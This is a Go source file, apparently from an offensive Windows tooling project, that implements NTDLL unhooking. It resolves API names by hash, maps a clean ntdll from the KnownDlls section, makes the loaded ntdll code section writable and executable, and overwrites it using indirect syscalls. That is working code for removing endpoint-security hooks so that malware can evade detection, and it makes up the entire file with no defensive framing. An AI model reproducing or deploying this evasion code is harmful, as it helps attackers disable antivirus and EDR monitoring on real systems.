package unhook

import (
	"fmt"
	"unsafe"

	"github.com/carved4/go-wincall/pkg/obf"
	"github.com/carved4/go-wincall/pkg/resolve"
	"github.com/carved4/go-wincall/pkg/syscall"
	"github.com/carved4/go-wincall/pkg/utils"
	"github.com/carved4/go-wincall/pkg/wincall"
)

func UnhookNtdll() {
	ntdllBase := resolve.GetModuleBase(obf.GetHash("ntdll.dll"))
	ldrGetKnownDllSectionHandle := resolve.GetFunctionAddress(ntdllBase, obf.GetHash("LdrGetKnownDllSectionHandle"))
	ntMapViewOfSection := resolve.GetSyscall(obf.GetHash("NtMapViewOfSection"))
	ntProt := resolve.GetSyscall(obf.GetHash("NtProtectVirtualMemory"))
	ntUnmapView := resolve.GetSyscall(obf.GetHash("NtUnmapViewOfSection"))
	ntClose := resolve.GetSyscall(obf.GetHash("NtClose"))
	ntFlush := resolve.GetSyscall(obf.GetHash("NtFlushInstructionCache"))
	ntdllStr, _ := wincall.UTF16PtrFromString("ntdll.dll")
	var sectionHandle uintptr
	ret, _, _ := wincall.CallG0(
		ldrGetKnownDllSectionHandle,
		ntdllStr,
		0,
		uintptr(unsafe.Pointer(&sectionHandle)),
	)
	if ret != 0 {
		return
	}
	var baseAddress uintptr
	var viewSize uintptr
	ret, _ = syscall.IndirectSyscall(
		ntMapViewOfSection.SSN,
		ntMapViewOfSection.Address,
		sectionHandle,
		uintptr(0xffffffffffffffff),
		uintptr(unsafe.Pointer(&baseAddress)),
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&viewSize)),
		2,
		0,
		0x20,
	)
	dosHeader := (*utils.IMAGE_DOS_HEADER)(unsafe.Pointer(ntdllBase))
	sizeOfCodeAddr := ntdllBase + uintptr(dosHeader.E_lfanew) + 0x18 + 0x14
	sizeOfCode := *(*uint32)(unsafe.Pointer(sizeOfCodeAddr))
	knownDllsTextAddr := baseAddress + 0x1000
	currNtdllTextAddr := ntdllBase + 0x1000
	base := currNtdllTextAddr
	size := uintptr(sizeOfCode)
	protectBase := base
	protectSize := size
	var oldProt uintptr
	ret, _ = syscall.IndirectSyscall(
		ntProt.SSN,
		ntProt.Address,
		uintptr(0xffffffffffffffff),
		uintptr(unsafe.Pointer(&protectBase)),
		uintptr(unsafe.Pointer(&protectSize)),
		0x40,
		uintptr(unsafe.Pointer(&oldProt)),
	)
	if ret != 0 {
		fmt.Printf("failed with 0x%x\n", ret)
	}
	memcpy(currNtdllTextAddr, knownDllsTextAddr, uintptr(sizeOfCode))
	protectBase = base
	protectSize = size
	var dummy uintptr
	ret, _ = syscall.IndirectSyscall(
		ntProt.SSN,
		ntProt.Address,
		uintptr(0xffffffffffffffff),
		uintptr(unsafe.Pointer(&protectBase)),
		uintptr(unsafe.Pointer(&protectSize)),
		oldProt,
		uintptr(unsafe.Pointer(&dummy)),
	)
	ret, _ = syscall.IndirectSyscall(
		ntUnmapView.SSN,
		ntUnmapView.Address,
		uintptr(0xffffffffffffffff),
		baseAddress,
	)
	if ret != 0 {
		return
	}

	ret, _ = syscall.IndirectSyscall(
		ntClose.SSN,
		ntClose.Address,
		sectionHandle,
	)
	if ret != 0 {
		return
	}

	ret, _ = syscall.IndirectSyscall(
		ntFlush.SSN,
		ntFlush.Address,
		uintptr(0xffffffffffffffff),
		currNtdllTextAddr,
		size,
	)
	if ret != 0 {
		return
	}
}

func memcpy(dst, src uintptr, size uintptr) {
	dstSlice := unsafe.Slice((*byte)(unsafe.Pointer(dst)), size)
	srcSlice := unsafe.Slice((*byte)(unsafe.Pointer(src)), size)
	copy(dstSlice, srcSlice)
}
